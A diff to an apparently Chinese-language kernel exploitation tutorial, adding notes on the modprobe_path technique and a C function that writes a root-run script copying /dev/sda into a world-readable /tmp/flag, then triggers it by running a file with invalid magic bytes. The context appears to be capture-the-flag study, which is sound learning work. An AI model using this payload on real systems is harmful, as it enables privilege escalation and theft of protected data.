@@ -104,6 +104,26 @@ modprobe_path可以利用的原因如下:<br>
 5. 创建`/tmp/exp`文件，在其中写入我们想要执行的命令<br>
 
 `modprobe_path`也是内核常用的利用手段。<br>
+`modprobe_path`有使用细节需要注意：<br>
+```c
+void get_flag(void){
+    puts("[*] Returned to userland, setting up for fake modprobe");
+    
+    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");//细节1：运行bash脚本前必须添加上 #!/bin/sh 否则触发了也不执行。
+    system("chmod +x /tmp/x");
+
+    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
+    system("chmod +x /tmp/dummy");
+
+    puts("[*] Run unknown file");
+    system("/tmp/dummy");//细节2： 运行未知文件要写全局路径，不要用./
+
+    puts("[*] Hopefully flag is readable");
+    system("cat /tmp/flag");
+
+    exit(0);
+}
+```
 
 ## 4.3 堆布局构造<br>
 在kernel heap场景当中，堆布局是非常困难的。`kmalloc`函数会从 `通用的kmalloc_kmem_cache`中返回对象。然而：**通用cache可以保存许多大小相似的不同对象类型，这意味着：所有进程都会通过kmalloc分配通用slot（syscall也非常经常需要分配内存）**<br>
